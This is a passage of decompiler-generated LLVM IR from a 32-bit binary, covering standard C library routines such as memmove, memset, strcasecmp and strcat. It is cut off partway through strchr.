dec_label_pc_804e453.preheader:                   ; preds = %dec_label_pc_804e447
  %v0_804e453.pre = load i32, i32* %esi.global-to-local, align 4
  %v3_804e453.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e453

dec_label_pc_804e453:                             ; preds = %dec_label_pc_804e453.preheader, %dec_label_pc_804e453
  %v3_804e453 = phi i32 [ %v3_804e453.pre, %dec_label_pc_804e453.preheader ], [ %v9_804e453, %dec_label_pc_804e453 ]
  %v0_804e453 = phi i32 [ %v0_804e453.pre, %dec_label_pc_804e453.preheader ], [ %v10_804e453, %dec_label_pc_804e453 ]
  %v1_804e453 = inttoptr i32 %v0_804e453 to i8*
  %v2_804e453 = load i8, i8* %v1_804e453, align 1
  %v4_804e453 = inttoptr i32 %v3_804e453 to i8*
  store i8 %v2_804e453, i8* %v4_804e453, align 1
  %v5_804e453 = load i32, i32* %edi.global-to-local, align 4
  %v6_804e453 = load i32, i32* %esi.global-to-local, align 4
  %v7_804e453 = load i1, i1* @df, align 1
  %v8_804e453 = select i1 %v7_804e453, i32 -1, i32 1
  %v9_804e453 = add i32 %v8_804e453, %v5_804e453
  %v10_804e453 = add i32 %v8_804e453, %v6_804e453
  store i32 %v9_804e453, i32* %edi.global-to-local, align 4
  store i32 %v10_804e453, i32* %esi.global-to-local, align 4
  %v0_804e454 = load i32, i32* @edx, align 4
  %v1_804e454 = add i32 %v0_804e454, -1
  %v8_804e454 = icmp eq i32 %v1_804e454, 0
  store i32 %v1_804e454, i32* @edx, align 4
  %v1_804e455 = icmp eq i1 %v8_804e454, false
  br i1 %v1_804e455, label %dec_label_pc_804e453, label %dec_label_pc_804e457

dec_label_pc_804e457:                             ; preds = %dec_label_pc_804e453, %dec_label_pc_804e447
  %v2_804e457 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e457, i32* @edi, align 4
  ret i32 %v4_804e422

; uselistorder directives
  uselistorder i32 %v1_804e454, { 1, 0 }
  uselistorder i32 %v10_804e453, { 1, 0 }
  uselistorder i32 %v9_804e453, { 1, 0 }
  uselistorder i32 %v1_804e44e, { 1, 0 }
  uselistorder i32 %v2_804e449, { 1, 0 }
  uselistorder i32 %v10_804e43d, { 0, 2, 1 }
  uselistorder i32 %v9_804e43d, { 1, 0, 3, 2 }
  uselistorder i32 %v4_804e422, { 4, 2, 3, 1, 0, 5 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %edi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804e453, { 1, 0 }
  uselistorder label %dec_label_pc_804e43d, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v5_804e460 = sub i32 %arg1, %arg2
  %v10_804e464 = icmp ult i32 %v5_804e460, %tmp
  %v1_804e468 = icmp eq i1 %v10_804e464, false
  call void @__pseudo_cond_branch(i1 %v1_804e468, i32 134538272)
  %v0_804e46f = load i32, i32* @edi, align 4
  store i32 %v0_804e46f, i32* %stack_var_-8, align 4
  %v2_804e47c = add i32 %arg1, -1
  %v3_804e47c = add i32 %v2_804e47c, %tmp
  %v4_804e47c = inttoptr i32 %v3_804e47c to i8*
  %v2_804e480 = add i32 %arg2, -1
  %v3_804e480 = add i32 %v2_804e480, %tmp
  %v4_804e480 = inttoptr i32 %v3_804e480 to i8*
  %v7_804e485 = call i8* @_memcpy(i8* %v4_804e47c, i8* %v4_804e480, i32 %tmp)
  %v8_804e485 = ptrtoint i8* %v7_804e485 to i32
  store i32 %v8_804e485, i32* @ecx, align 4
  store i1 false, i1* @df, align 1
  %v2_804e488 = add i32 %tmp, %arg1
  %v2_804e48b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e48b, i32* @edi, align 4
  ret i32 %v2_804e488

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v6_804e497 = icmp ugt i32 %arg3, 62
  %v4_804e5073 = urem i32 %arg2, 256
  br i1 %v6_804e497, label %dec_label_pc_804e507, label %dec_label_pc_804e499

dec_label_pc_804e499:                             ; preds = %entry
  %v6_804e499 = load i32, i32* @edx, align 4
  %v7_804e499 = and i32 %v6_804e499, -256
  %v8_804e499 = or i32 %v7_804e499, %v4_804e5073
  store i32 %v8_804e499, i32* @edx, align 4
  %v4_804e49d = ptrtoint i8* %arg1 to i32
  %v1_804e4a1 = icmp eq i32 %arg3, 0
  br i1 %v1_804e4a1, label %dec_label_pc_804e506, label %dec_label_pc_804e4a5

dec_label_pc_804e4a5:                             ; preds = %dec_label_pc_804e499
  %v2_804e4a5 = mul i32 %arg2, 256
  %v3_804e4a5 = and i32 %v2_804e4a5, 65280
  %v4_804e4a5 = and i32 %v8_804e499, -65281
  %v5_804e4a5 = or i32 %v4_804e4a5, %v3_804e4a5
  store i32 %v5_804e4a5, i32* @edx, align 4
  %v1_804e4a7 = trunc i32 %arg2 to i8
  store i8 %v1_804e4a7, i8* %arg1, align 1
  %v0_804e4a9 = load i32, i32* @edx, align 4
  %v1_804e4a9 = trunc i32 %v0_804e4a9 to i8
  %v4_804e4a9 = load i32, i32* %ecx.global-to-local, align 4
  %v5_804e4a9 = add i32 %v4_804e49d, -1
  %v6_804e4a9 = add i32 %v5_804e4a9, %v4_804e4a9
  %v7_804e4a9 = inttoptr i32 %v6_804e4a9 to i8*
  store i8 %v1_804e4a9, i8* %v7_804e4a9, align 1
  %v0_804e4ad = load i32, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804e4ad, 3
  br i1 %tmp, label %dec_label_pc_804e506, label %dec_label_pc_804e4b2

dec_label_pc_804e4b2:                             ; preds = %dec_label_pc_804e4a5
  %v0_804e4b2 = load i32, i32* @edx, align 4
  %v1_804e4b2 = trunc i32 %v0_804e4b2 to i16
  %v4_804e4b2 = add i32 %v4_804e49d, 1
  %v5_804e4b2 = inttoptr i32 %v4_804e4b2 to i16*
  store i16 %v1_804e4b2, i16* %v5_804e4b2, align 2
  %v0_804e4b6 = load i32, i32* @edx, align 4
  %v1_804e4b6 = trunc i32 %v0_804e4b6 to i16
  %v4_804e4b6 = load i32, i32* %ecx.global-to-local, align 4
  %v5_804e4b6 = add i32 %v4_804e49d, -3
  %v6_804e4b6 = add i32 %v5_804e4b6, %v4_804e4b6
  %v7_804e4b6 = inttoptr i32 %v6_804e4b6 to i16*
  store i16 %v1_804e4b6, i16* %v7_804e4b6, align 2
  %v0_804e4bb = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_804e4bb, 7
  br i1 %tmp14, label %dec_label_pc_804e506, label %dec_label_pc_804e4c0

dec_label_pc_804e4c0:                             ; preds = %dec_label_pc_804e4b2
  %v0_804e4c0 = load i32, i32* @edx, align 4
  %v2_804e4c0 = mul i32 %v0_804e4c0, 65536
  %v8_804e4c3 = or i32 %v3_804e4a5, %v4_804e5073
  %v9_804e4c7 = or i32 %v8_804e4c3, %v2_804e4c0
  store i32 %v9_804e4c7, i32* @edx, align 4
  %v3_804e4cb = add i32 %v4_804e49d, 3
  %v4_804e4cb = inttoptr i32 %v3_804e4cb to i32*
  store i32 %v9_804e4c7, i32* %v4_804e4cb, align 4
  %v0_804e4ce = load i32, i32* @edx, align 4
  %v3_804e4ce = load i32, i32* %ecx.global-to-local, align 4
  %v4_804e4ce = add i32 %v4_804e49d, -7
  %v5_804e4ce = add i32 %v4_804e4ce, %v3_804e4ce
  %v6_804e4ce = inttoptr i32 %v5_804e4ce to i32*
  store i32 %v0_804e4ce, i32* %v6_804e4ce, align 4
  %v0_804e4d2 = load i32, i32* %ecx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_804e4d2, 15
  br i1 %tmp15, label %dec_label_pc_804e506, label %dec_label_pc_804e4d7

dec_label_pc_804e4d7:                             ; preds = %dec_label_pc_804e4c0
  %v0_804e4d7 = load i32, i32* @edx, align 4
  %v3_804e4d7 = add i32 %v4_804e49d, 7
  %v4_804e4d7 = inttoptr i32 %v3_804e4d7 to i32*
  store i32 %v0_804e4d7, i32* %v4_804e4d7, align 4
  %v0_804e4da = load i32, i32* @edx, align 4
  %v3_804e4da = add i32 %v4_804e49d, 11
  %v4_804e4da = inttoptr i32 %v3_804e4da to i32*
  store i32 %v0_804e4da, i32* %v4_804e4da, align 4
  %v0_804e4dd = load i32, i32* @edx, align 4
  %v3_804e4dd = load i32, i32* %ecx.global-to-local, align 4
  %v4_804e4dd = add i32 %v4_804e49d, -15
  %v5_804e4dd = add i32 %v4_804e4dd, %v3_804e4dd
  %v6_804e4dd = inttoptr i32 %v5_804e4dd to i32*
  store i32 %v0_804e4dd, i32* %v6_804e4dd, align 4
  %v0_804e4e1 = load i32, i32* @edx, align 4
  %v3_804e4e1 = load i32, i32* %ecx.global-to-local, align 4
  %v4_804e4e1 = add i32 %v4_804e49d, -11
  %v5_804e4e1 = add i32 %v4_804e4e1, %v3_804e4e1
  %v6_804e4e1 = inttoptr i32 %v5_804e4e1 to i32*
  store i32 %v0_804e4e1, i32* %v6_804e4e1, align 4
  %v0_804e4e5 = load i32, i32* %ecx.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_804e4e5, 31
  br i1 %tmp16, label %dec_label_pc_804e506, label %dec_label_pc_804e4ea

dec_label_pc_804e4ea:                             ; preds = %dec_label_pc_804e4d7
  %v0_804e4ea = load i32, i32* @edx, align 4
  %v3_804e4ea = add i32 %v4_804e49d, 15
  %v4_804e4ea = inttoptr i32 %v3_804e4ea to i32*
  store i32 %v0_804e4ea, i32* %v4_804e4ea, align 4
  %v0_804e4ed = load i32, i32* @edx, align 4
  %v3_804e4ed = add i32 %v4_804e49d, 19
  %v4_804e4ed = inttoptr i32 %v3_804e4ed to i32*
  store i32 %v0_804e4ed, i32* %v4_804e4ed, align 4
  %v0_804e4f0 = load i32, i32* @edx, align 4
  %v3_804e4f0 = add i32 %v4_804e49d, 23
  %v4_804e4f0 = inttoptr i32 %v3_804e4f0 to i32*
  store i32 %v0_804e4f0, i32* %v4_804e4f0, align 4
  %v0_804e4f3 = load i32, i32* @edx, align 4
  %v3_804e4f3 = add i32 %v4_804e49d, 27
  %v4_804e4f3 = inttoptr i32 %v3_804e4f3 to i32*
  store i32 %v0_804e4f3, i32* %v4_804e4f3, align 4
  %v0_804e4f6 = load i32, i32* @edx, align 4
  %v3_804e4f6 = load i32, i32* %ecx.global-to-local, align 4
  %v4_804e4f6 = add i32 %v4_804e49d, -31
  %v5_804e4f6 = add i32 %v4_804e4f6, %v3_804e4f6
  %v6_804e4f6 = inttoptr i32 %v5_804e4f6 to i32*
  store i32 %v0_804e4f6, i32* %v6_804e4f6, align 4
  %v0_804e4fa = load i32, i32* @edx, align 4
  %v3_804e4fa = load i32, i32* %ecx.global-to-local, align 4
  %v4_804e4fa = add i32 %v4_804e49d, -27
  %v5_804e4fa = add i32 %v4_804e4fa, %v3_804e4fa
  %v6_804e4fa = inttoptr i32 %v5_804e4fa to i32*
  store i32 %v0_804e4fa, i32* %v6_804e4fa, align 4
  %v0_804e4fe = load i32, i32* @edx, align 4
  %v3_804e4fe = load i32, i32* %ecx.global-to-local, align 4
  %v4_804e4fe = add i32 %v4_804e49d, -23
  %v5_804e4fe = add i32 %v4_804e4fe, %v3_804e4fe
  %v6_804e4fe = inttoptr i32 %v5_804e4fe to i32*
  store i32 %v0_804e4fe, i32* %v6_804e4fe, align 4
  %v0_804e502 = load i32, i32* @edx, align 4
  %v3_804e502 = load i32, i32* %ecx.global-to-local, align 4
  %v4_804e502 = add i32 %v4_804e49d, -19
  %v5_804e502 = add i32 %v4_804e502, %v3_804e502
  %v6_804e502 = inttoptr i32 %v5_804e502 to i32*
  store i32 %v0_804e502, i32* %v6_804e502, align 4
  br label %dec_label_pc_804e506

dec_label_pc_804e506:                             ; preds = %dec_label_pc_804e4d7, %dec_label_pc_804e4c0, %dec_label_pc_804e4b2, %dec_label_pc_804e4a5, %dec_label_pc_804e499, %dec_label_pc_804e4ea
  ret i32 %v4_804e49d

dec_label_pc_804e507:                             ; preds = %entry
  %v0_804e50c = load i32, i32* @edi, align 4
  %v3_804e510 = mul nuw i32 %v4_804e5073, 16843009
  %v4_804e516 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e516, i32* %edi.global-to-local, align 4
  %v1_804e51a = urem i32 %v4_804e516, 16
  %v2_804e51a = icmp eq i32 %v1_804e51a, 0
  %v3_804e520 = add i32 %v4_804e516, -4
  %v4_804e520 = add i32 %v3_804e520, %arg3
  %v5_804e520 = inttoptr i32 %v4_804e520 to i32*
  store i32 %v3_804e510, i32* %v5_804e520, align 4
  %v1_804e524 = icmp eq i1 %v2_804e51a, false
  br i1 %v1_804e524, label %dec_label_pc_804e534, label %dec_label_pc_804e507.dec_label_pc_804e526_crit_edge

dec_label_pc_804e507.dec_label_pc_804e526_crit_edge: ; preds = %dec_label_pc_804e507
  %v0_804e526.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804e529.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e526

dec_label_pc_804e526:                             ; preds = %dec_label_pc_804e507.dec_label_pc_804e526_crit_edge, %dec_label_pc_804e534
  %v0_804e529 = phi i32 [ %v0_804e529.pre, %dec_label_pc_804e507.dec_label_pc_804e526_crit_edge ], [ %v2_804e548, %dec_label_pc_804e534 ]
  %v0_804e526 = phi i32 [ %v0_804e526.pre, %dec_label_pc_804e507.dec_label_pc_804e526_crit_edge ], [ %v2_804e546, %dec_label_pc_804e534 ]
  %v2_804e526 = udiv i32 %v0_804e526, 4
  store i32 %v2_804e526, i32* %ecx.global-to-local, align 4
  %v3_804e529 = inttoptr i32 %v0_804e529 to i8*
  %v4_804e529 = call i8* @_memset(i8* %v3_804e529, i32 %v3_804e510, i32 %v2_804e526)
  %v5_804e529 = ptrtoint i8* %v4_804e529 to i32
  store i32 %v5_804e529, i32* %ecx.global-to-local, align 4
  store i32 %v0_804e50c, i32* @edi, align 4
  ret i32 %v4_804e516

dec_label_pc_804e534:                             ; preds = %dec_label_pc_804e507
  %v1_804e536 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e536 = sub i32 0, %v1_804e536
  %v1_804e538 = urem i32 %v2_804e536, 16
  store i32 %v1_804e538, i32* @edx, align 4
  %v2_804e53b = inttoptr i32 %v1_804e536 to i32*
  store i32 %v3_804e510, i32* %v2_804e53b, align 4
  %v1_804e53d = load i32, i32* %edi.global-to-local, align 4
  %v2_804e53d = add i32 %v1_804e53d, 4
  %v3_804e53d = inttoptr i32 %v2_804e53d to i32*
  store i32 %v3_804e510, i32* %v3_804e53d, align 4
  %v1_804e540 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e540 = add i32 %v1_804e540, 8
  %v3_804e540 = inttoptr i32 %v2_804e540 to i32*
  store i32 %v3_804e510, i32* %v3_804e540, align 4
  %v1_804e543 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e543 = add i32 %v1_804e543, 12
  %v3_804e543 = inttoptr i32 %v2_804e543 to i32*
  store i32 %v3_804e510, i32* %v3_804e543, align 4
  %v0_804e546 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e546 = load i32, i32* @edx, align 4
  %v2_804e546 = sub i32 %v0_804e546, %v1_804e546
  store i32 %v2_804e546, i32* %ecx.global-to-local, align 4
  %v0_804e548 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e548 = add i32 %v0_804e548, %v1_804e546
  store i32 %v2_804e548, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e526

; uselistorder directives
  uselistorder i32 %v2_804e548, { 1, 0 }
  uselistorder i32 %v2_804e546, { 1, 0 }
  uselistorder i32 %v2_804e526, { 1, 0 }
  uselistorder i32 %v4_804e516, { 2, 1, 0, 3 }
  uselistorder i32 %v3_804e510, { 4, 2, 0, 1, 3, 5 }
  uselistorder i32 %v4_804e49d, { 17, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 %v4_804e5073, { 0, 2, 1 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 4, 5, 6, 1, 7 }
  uselistorder i32* %ecx.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 -19, { 1, 0 }
  uselistorder i32 23, { 2, 0, 1 }
  uselistorder i32 19, { 3, 1, 2, 0 }
  uselistorder i32 -11, { 2, 0, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e526, { 1, 0 }
  uselistorder label %dec_label_pc_804e506, { 5, 0, 1, 2, 3, 4 }
}

define i32 @strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e552 = load i32, i32* @ebx, align 4
  store i32 %v0_804e552, i32* %stack_var_-12, align 4
  %v4_804e556 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e556, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_804e55e = load i8, i8* %arg1, align 1
  %v3_804e55e = zext i8 %v2_804e55e to i32
  %v4_804e561 = icmp eq i8 %v2_804e55e, 0
  %v1_804e563 = icmp eq i1 %v4_804e561, false
  br i1 %v1_804e563, label %dec_label_pc_804e594, label %dec_label_pc_804e59b

dec_label_pc_804e567:                             ; preds = %dec_label_pc_804e594
  %v1_804e567 = trunc i32 %v0_804e56b to i8
  %v15_804e567 = icmp eq i8 %v1_804e567, %v2_804e594
  br i1 %v15_804e567, label %dec_label_pc_804e587, label %dec_label_pc_804e56b

dec_label_pc_804e56b:                             ; preds = %dec_label_pc_804e567
  %v1_804e571 = call i32 @tolower(i32 %v0_804e56b)
  %v0_804e578 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e578 = inttoptr i32 %v0_804e578 to i8*
  %v2_804e578 = load i8, i8* %v1_804e578, align 1
  %v3_804e578 = zext i8 %v2_804e578 to i32
  %v1_804e57e = call i32 @tolower(i32 %v3_804e578)
  %v12_804e583 = icmp eq i32 %v1_804e571, %v1_804e57e
  %v1_804e585 = icmp eq i1 %v12_804e583, false
  %v0_804e5be = load i32, i32* %edi.global-to-local, align 4
  br i1 %v1_804e585, label %dec_label_pc_804e5be, label %dec_label_pc_804e56b.dec_label_pc_804e587_crit_edge

dec_label_pc_804e56b.dec_label_pc_804e587_crit_edge: ; preds = %dec_label_pc_804e56b
  %v0_804e58a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e587

dec_label_pc_804e587:                             ; preds = %dec_label_pc_804e56b.dec_label_pc_804e587_crit_edge, %dec_label_pc_804e567
  %v0_804e58a = phi i32 [ %v0_804e58a.pre, %dec_label_pc_804e56b.dec_label_pc_804e587_crit_edge ], [ %v0_804e594, %dec_label_pc_804e567 ]
  %v0_804e587 = phi i32 [ %v0_804e5be, %dec_label_pc_804e56b.dec_label_pc_804e587_crit_edge ], [ %v0_804e5874, %dec_label_pc_804e567 ]
  %v1_804e587 = add i32 %v0_804e587, 1
  store i32 %v1_804e587, i32* %edi.global-to-local, align 4
  %v1_804e58a = add i32 %v0_804e58a, 1
  store i32 %v1_804e58a, i32* %esi.global-to-local, align 4
  %v1_804e58d = inttoptr i32 %v1_804e587 to i8*
  %v2_804e58d = load i8, i8* %v1_804e58d, align 1
  %v3_804e58d = zext i8 %v2_804e58d to i32
  %v4_804e590 = icmp eq i8 %v2_804e58d, 0
  br i1 %v4_804e590, label %dec_label_pc_804e59b, label %dec_label_pc_804e594

dec_label_pc_804e594:                             ; preds = %entry, %dec_label_pc_804e587
  %v0_804e5874 = phi i32 [ %v1_804e587, %dec_label_pc_804e587 ], [ %v4_804e556, %entry ]
  %v0_804e56b = phi i32 [ %v3_804e58d, %dec_label_pc_804e587 ], [ %v3_804e55e, %entry ]
  %v0_804e594 = phi i32 [ %v1_804e58a, %dec_label_pc_804e587 ], [ %arg2, %entry ]
  %v1_804e594 = inttoptr i32 %v0_804e594 to i8*
  %v2_804e594 = load i8, i8* %v1_804e594, align 1
  %v4_804e597 = icmp eq i8 %v2_804e594, 0
  %v1_804e599 = icmp eq i1 %v4_804e597, false
  br i1 %v1_804e599, label %dec_label_pc_804e567, label %dec_label_pc_804e59b

dec_label_pc_804e59b:                             ; preds = %dec_label_pc_804e587, %dec_label_pc_804e594, %entry, %dec_label_pc_804e5be
  %v0_804e59b = phi i32 [ %v3_804e55e, %entry ], [ %v3_804e5be, %dec_label_pc_804e5be ], [ %v3_804e58d, %dec_label_pc_804e587 ], [ %v0_804e56b, %dec_label_pc_804e594 ]
  %v1_804e59b = urem i32 %v0_804e59b, 256
  %v1_804e5a1 = call i32 @tolower(i32 %v1_804e59b)
  %v0_804e5a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e5a8 = inttoptr i32 %v0_804e5a8 to i8*
  %v2_804e5a8 = load i8, i8* %v1_804e5a8, align 1
  %v3_804e5a8 = zext i8 %v2_804e5a8 to i32
  %v1_804e5ae = call i32 @tolower(i32 %v3_804e5a8)
  %v2_804e5b6 = sub i32 %v1_804e5a1, %v1_804e5ae
  %v2_804e5ba = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e5ba, i32* @ebx, align 4
  ret i32 %v2_804e5b6

dec_label_pc_804e5be:                             ; preds = %dec_label_pc_804e56b
  %v1_804e5be = inttoptr i32 %v0_804e5be to i8*
  %v2_804e5be = load i8, i8* %v1_804e5be, align 1
  %v3_804e5be = zext i8 %v2_804e5be to i32
  br label %dec_label_pc_804e59b

; uselistorder directives
  uselistorder i8 %v2_804e594, { 1, 0 }
  uselistorder i32 %v0_804e594, { 1, 0 }
  uselistorder i32 %v0_804e56b, { 0, 2, 1 }
  uselistorder i32 %v3_804e55e, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 3, 2, 4 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e59b, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804e594, { 1, 0 }
}

define i32 @__strcasecmp_l(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_804e5d6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e5d6, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_804e5de = load i8, i8* %arg1, align 1
  %v3_804e5de = zext i8 %v2_804e5de to i32
  %v4_804e5e1 = icmp eq i8 %v2_804e5de, 0
  %v1_804e5e3 = icmp eq i1 %v4_804e5e1, false
  br i1 %v1_804e5e3, label %dec_label_pc_804e614, label %dec_label_pc_804e61b

dec_label_pc_804e5e7:                             ; preds = %dec_label_pc_804e614
  %v1_804e5e7 = trunc i32 %v0_804e5eb to i8
  %v15_804e5e7 = icmp eq i8 %v1_804e5e7, %v2_804e614
  br i1 %v15_804e5e7, label %dec_label_pc_804e607, label %dec_label_pc_804e5eb

dec_label_pc_804e5eb:                             ; preds = %dec_label_pc_804e5e7
  %v1_804e5f1 = call i32 @tolower(i32 %v0_804e5eb)
  %v0_804e5f8 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e5f8 = inttoptr i32 %v0_804e5f8 to i8*
  %v2_804e5f8 = load i8, i8* %v1_804e5f8, align 1
  %v3_804e5f8 = zext i8 %v2_804e5f8 to i32
  %v1_804e5fe = call i32 @tolower(i32 %v3_804e5f8)
  %v12_804e603 = icmp eq i32 %v1_804e5f1, %v1_804e5fe
  %v1_804e605 = icmp eq i1 %v12_804e603, false
  %v0_804e63e = load i32, i32* %edi.global-to-local, align 4
  br i1 %v1_804e605, label %dec_label_pc_804e63e, label %dec_label_pc_804e5eb.dec_label_pc_804e607_crit_edge

dec_label_pc_804e5eb.dec_label_pc_804e607_crit_edge: ; preds = %dec_label_pc_804e5eb
  %v0_804e60a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e607

dec_label_pc_804e607:                             ; preds = %dec_label_pc_804e5eb.dec_label_pc_804e607_crit_edge, %dec_label_pc_804e5e7
  %v0_804e60a = phi i32 [ %v0_804e60a.pre, %dec_label_pc_804e5eb.dec_label_pc_804e607_crit_edge ], [ %v0_804e614, %dec_label_pc_804e5e7 ]
  %v0_804e607 = phi i32 [ %v0_804e63e, %dec_label_pc_804e5eb.dec_label_pc_804e607_crit_edge ], [ %v0_804e6075, %dec_label_pc_804e5e7 ]
  %v1_804e607 = add i32 %v0_804e607, 1
  store i32 %v1_804e607, i32* %edi.global-to-local, align 4
  %v1_804e60a = add i32 %v0_804e60a, 1
  store i32 %v1_804e60a, i32* %esi.global-to-local, align 4
  %v1_804e60d = inttoptr i32 %v1_804e607 to i8*
  %v2_804e60d = load i8, i8* %v1_804e60d, align 1
  %v3_804e60d = zext i8 %v2_804e60d to i32
  %v4_804e610 = icmp eq i8 %v2_804e60d, 0
  br i1 %v4_804e610, label %dec_label_pc_804e61b, label %dec_label_pc_804e614

dec_label_pc_804e614:                             ; preds = %entry, %dec_label_pc_804e607
  %v0_804e6075 = phi i32 [ %v1_804e607, %dec_label_pc_804e607 ], [ %v4_804e5d6, %entry ]
  %v0_804e5eb = phi i32 [ %v3_804e60d, %dec_label_pc_804e607 ], [ %v3_804e5de, %entry ]
  %v0_804e614 = phi i32 [ %v1_804e60a, %dec_label_pc_804e607 ], [ %arg2, %entry ]
  %v1_804e614 = inttoptr i32 %v0_804e614 to i8*
  %v2_804e614 = load i8, i8* %v1_804e614, align 1
  %v4_804e617 = icmp eq i8 %v2_804e614, 0
  %v1_804e619 = icmp eq i1 %v4_804e617, false
  br i1 %v1_804e619, label %dec_label_pc_804e5e7, label %dec_label_pc_804e61b

dec_label_pc_804e61b:                             ; preds = %dec_label_pc_804e607, %dec_label_pc_804e614, %entry, %dec_label_pc_804e63e
  %v0_804e61b = phi i32 [ %v3_804e5de, %entry ], [ %v3_804e63e, %dec_label_pc_804e63e ], [ %v3_804e60d, %dec_label_pc_804e607 ], [ %v0_804e5eb, %dec_label_pc_804e614 ]
  %v1_804e61b = urem i32 %v0_804e61b, 256
  %v1_804e621 = call i32 @tolower(i32 %v1_804e61b)
  %v0_804e628 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e628 = inttoptr i32 %v0_804e628 to i8*
  %v2_804e628 = load i8, i8* %v1_804e628, align 1
  %v3_804e628 = zext i8 %v2_804e628 to i32
  %v1_804e62e = call i32 @tolower(i32 %v3_804e628)
  %v2_804e636 = sub i32 %v1_804e621, %v1_804e62e
  ret i32 %v2_804e636

dec_label_pc_804e63e:                             ; preds = %dec_label_pc_804e5eb
  %v1_804e63e = inttoptr i32 %v0_804e63e to i8*
  %v2_804e63e = load i8, i8* %v1_804e63e, align 1
  %v3_804e63e = zext i8 %v2_804e63e to i32
  br label %dec_label_pc_804e61b

; uselistorder directives
  uselistorder i8 %v2_804e614, { 1, 0 }
  uselistorder i32 %v0_804e614, { 1, 0 }
  uselistorder i32 %v0_804e5eb, { 0, 2, 1 }
  uselistorder i32 %v3_804e5de, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32)* @tolower, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e61b, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804e614, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804e650 = load i32, i32* @ebx, align 4
  store i32 %v0_804e650, i32* %stack_var_-4, align 4
  %v4_804e654 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e654, i32* @ebx, align 4
  %v3_804e65b = call i32 @strlen(i8* %arg1)
  %v1_804e668 = load i32, i32* @ebx, align 4
  %v2_804e668 = add i32 %v1_804e668, %v3_804e65b
  %v3_804e66d = call i32 @strcpy(i32 %v2_804e668, i32 %arg2)
  %v0_804e672 = load i32, i32* @ebx, align 4
  %v2_804e677 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e677, i32* @ebx, align 4
  ret i32 %v0_804e672

; uselistorder directives
  uselistorder i32 (i32, i32)* @strcpy, { 0, 9, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strchr(i32 %arg1, i8 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804e680 = load i32, i32* @ebx, align 4
  store i32 %v0_804e680, i32* %stack_var_-4, align 4
  %v4_804e684 = sext i8 %arg2 to i32
  store i32 %v4_804e684, i32* @ebx, align 4
  %v3_804e693 = inttoptr i32 %arg1 to i8*
  %v4_804e693 = call i32 @__strchrnul(i8* %v3_804e693, i32 %v4_804e684)
  store i32 %v4_804e693, i32* @edx, align 4
  %v1_804e69c = inttoptr i32 %v4_804e693 to i8*
